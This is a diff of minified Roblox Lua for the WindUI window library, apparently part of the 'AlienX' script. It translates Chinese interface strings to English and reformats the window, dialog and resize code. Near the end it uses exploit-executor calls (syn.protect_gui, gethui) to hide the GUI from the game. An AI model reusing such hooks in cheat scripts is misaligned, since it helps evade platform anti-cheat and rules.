     g(p.UIElements.Main,0.45,{Position=L and I or UDim2.new(0.5,0,0.5,26)},Enum.EasingStyle.Quint,Enum.EasingDirection.Out):Play()
-
-
-
     p.IsFullscreen=not L
   end
-
-
   p:CreateTopbarButton("Minimize","minus",function()
     p:Close()
     task.spawn(function()
@@ -6606,45 +6135,41 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
         x.Visible=true
       end
     end)
-
-    local K=w and"Press "..p.ToggleKey.Name.."打开窗口"or"点击按钮打开窗口"
-
+    local K=w and"Press "..p.ToggleKey.Name.." to open the Window"or"Click the Button to open the Window"
     if not p.IsOpenButtonEnabled then
       n=true
     end
     if not n then
       n=not n
-      o.WindUI:Notify("最小化", "你已隐藏窗口"..K, 5, "eye-off")
+      o.WindUI:Notify{
+        Title="Minimize",
+        Content="You've closed the Window. "..K,
+        Icon="eye-off",
+        Duration=5,
+      }
     end
   end,997)
-
   function p.OnClose(K,L)
     p.OnCloseCallback=L
   end
   function p.OnDestroy(K,L)
     p.OnDestroyCallback=L
   end
-
   function p.Open(K)
     task.spawn(function()
       task.wait(.06)
       p.Closed=false
-
       g(p.UIElements.Main.Background,0.2,{
         ImageTransparency=o.Transparent and o.WindUI.TransparencyValue or 0,
       },Enum.EasingStyle.Quint,Enum.EasingDirection.Out):Play()
-
       g(p.UIElements.Main.Background,0.4,{
         Size=UDim2.new(1,0,1,0),
       },Enum.EasingStyle.Exponential,Enum.EasingDirection.Out):Play()
-
       g(p.UIElements.Main.Background.ImageLabel,0.2,{ImageTransparency=p.BackgroundImageTransparency},Enum.EasingStyle.Quint,Enum.EasingDirection.Out):Play()
-
       g(v,0.25,{ImageTransparency=.7},Enum.EasingStyle.Quint,Enum.EasingDirection.Out):Play()
       if UIStroke then
         g(UIStroke,0.25,{Transparency=.8},Enum.EasingStyle.Quint,Enum.EasingDirection.Out):Play()
       end
-
       task.spawn(function()
         task.wait(.5)
         g(E,.45,{Size=UDim2.new(0,200,0,4),ImageTransparency=.8},Enum.EasingStyle.Exponential,Enum.EasingDirection.Out):Play()
@@ -6655,10 +6180,7 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
           p.CanResize=true
         end
       end)
-
-
       p.CanDropdown=true
-
       p.UIElements.Main.Visible=true
       task.spawn(function()
         task.wait(.19)
@@ -6668,42 +6190,33 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
   end
   function p.Close(K)
     local L={}
-
     if p.OnCloseCallback then
       task.spawn(function()
         b.SafeCallback(p.OnCloseCallback)
       end)
     end
-
     p.UIElements.Main.Main.Visible=false
     p.CanDropdown=false
     p.Closed=true
-
     g(p.UIElements.Main.Background,0.32,{
       ImageTransparency=1,
     },Enum.EasingStyle.Quint,Enum.EasingDirection.InOut):Play()
-
     g(p.UIElements.Main.Background,0.4,{
       Size=UDim2.new(1,0,1,-240),
     },Enum.EasingStyle.Exponential,Enum.EasingDirection.InOut):Play()
-
-
     g(p.UIElements.Main.Background.ImageLabel,0.2,{ImageTransparency=1},Enum.EasingStyle.Quint,Enum.EasingDirection.Out):Play()
     g(v,0.25,{ImageTransparency=1},Enum.EasingStyle.Quint,Enum.EasingDirection.Out):Play()
     if UIStroke then
       g(UIStroke,0.25,{Transparency=1},Enum.EasingStyle.Quint,Enum.EasingDirection.Out):Play()
     end
-
     g(E,.3,{Size=UDim2.new(0,0,0,4),ImageTransparency=1},Enum.EasingStyle.Exponential,Enum.EasingDirection.InOut):Play()
     g(r.ImageLabel,.3,{ImageTransparency=1},Enum.EasingStyle.Exponential,Enum.EasingDirection.Out):Play()
     G:Set(false)
     p.CanResize=false
-
     task.spawn(function()
       task.wait(0.4)
       p.UIElements.Main.Visible=false
     end)
-
     function L.Destroy(M)
       if p.OnDestroyCallback then
         task.spawn(function()
@@ -6713,25 +6226,15 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
       p.Destroyed=true
       task.wait(0.4)
       o.Parent.Parent:Destroy()
-
-
     end
-
     return L
   end
-
   function p.ToggleTransparency(K,L)
-
     p.Transparent=L
     o.WindUI.Transparent=L
-
     p.UIElements.Main.Background.ImageTransparency=L and o.WindUI.TransparencyValue or 0
-
     p.UIElements.MainBar.Background.ImageTransparency=L and 0.97 or 0.95
-
   end
-
-
   function p.SetUIScale(K,L)
     o.WindUI.UIScale=L
     g(o.WindUI.ScreenGui.UIScale,.2,{Scale=L},Enum.EasingStyle.Quint,Enum.EasingDirection.Out):Play()
@@ -6744,14 +6247,12 @@ local a a={cache={}, load=function(b)if not a.cache[b]then a.cache[b]={c=a[b]()}
     end
   end
 end
-
 if not w and p.IsOpenButtonEnabled then
   b.AddSignal(y.TextButton.MouseButton1Click,function()
     x.Visible=false
     p:Open()
   end)
 end
-
 b.AddSignal(aa.InputBegan,function(K,L)
   if L then return end
   if K.KeyCode==p.ToggleKey then
@@ -6882,7 +6383,15 @@ function p.Dialog(O,P)
   })
   local T
   if P.Icon then
-    T=b.Image(P.Icon,Q.Title..":"..P.Icon,0,p,"Dialog",true,P.IconThemed)
+    T=b.Image(
+    P.Icon,
+    Q.Title..":"..P.Icon,
+    0,
+    p,
+    "Dialog",
+    true,
+    P.IconThemed
+    )
     T.Size=UDim2.new(0,22,0,22)
     T.Parent=S
   end
@@ -6942,7 +6451,15 @@ function p.Dialog(O,P)
     FillDirection="Horizontal",
     HorizontalAlignment="Right",
   })
-  local V=e("Frame",{Size=UDim2.new(1,0,0,40),AutomaticSize="None",BackgroundTransparency=1,Parent=R.UIElements.Main,LayoutOrder=4},{U})
+  local V=e("Frame",{
+    Size=UDim2.new(1,0,0,40),
+    AutomaticSize="None",
+    BackgroundTransparency=1,
+    Parent=R.UIElements.Main,
+    LayoutOrder=4,
+  },{
+    U,
+  })
   local W={}
   for X,Y in next,Q.Buttons do
     local Z=i(Y.Title,Y.Icon,Y.Callback,Y.Variant,V,R,true)
@@ -6996,19 +6513,16 @@ end
 p:CreateTopbarButton("Close","x",function()
   g(p.UIElements.Main,0.35,{Position=UDim2.new(0.5,0,0.5,0)},Enum.EasingStyle.Quint,Enum.EasingDirection.Out):Play()
   p:Dialog{
-
     Title="关闭AlienX",
     Content="关闭后无法打开AlienX-UI窗口需要重新加载脚本是否关闭",
     Buttons={
       {
-        Title="取消",
-
+        Title="Cancel",
         Callback=function()end,
         Variant="Secondary",
       },
       {
         Title="狠心关闭",
-
         Callback=function()p:Close():Destroy()end,
         Variant="Primary",
       }
@@ -7047,7 +6561,11 @@ b.AddSignal(aa.InputChanged,function(ad)
     if isResizing and p.CanResize then
       local ae=ad.Position-initialInputPosition
       local af=UDim2.new(0,initialSize.X.Offset+ae.X*2,0,initialSize.Y.Offset+ae.Y*2)
-      g(p.UIElements.Main,0,{Size=UDim2.new(0,math.clamp(af.X.Offset,480,700),0,math.clamp(af.Y.Offset,350,520))}):Play()
+      g(p.UIElements.Main,0,{
+        Size=UDim2.new(
+        0,math.clamp(af.X.Offset,480,700),
+        0,math.clamp(af.Y.Offset,350,520)
+        )}):Play()
     end
   end
 end)
@@ -7104,6 +6622,7 @@ local ag=game:GetService"Players"and game:GetService"Players".LocalPlayer or nil
 aa.Themes=ac
 local ah=protectgui or(syn and syn.protect_gui)or function()end
 local ai=gethui and gethui()or game.CoreGui
+
 aa.ScreenGui=ae("ScreenGui",{
   Name="WindUI",
   Parent=ai,
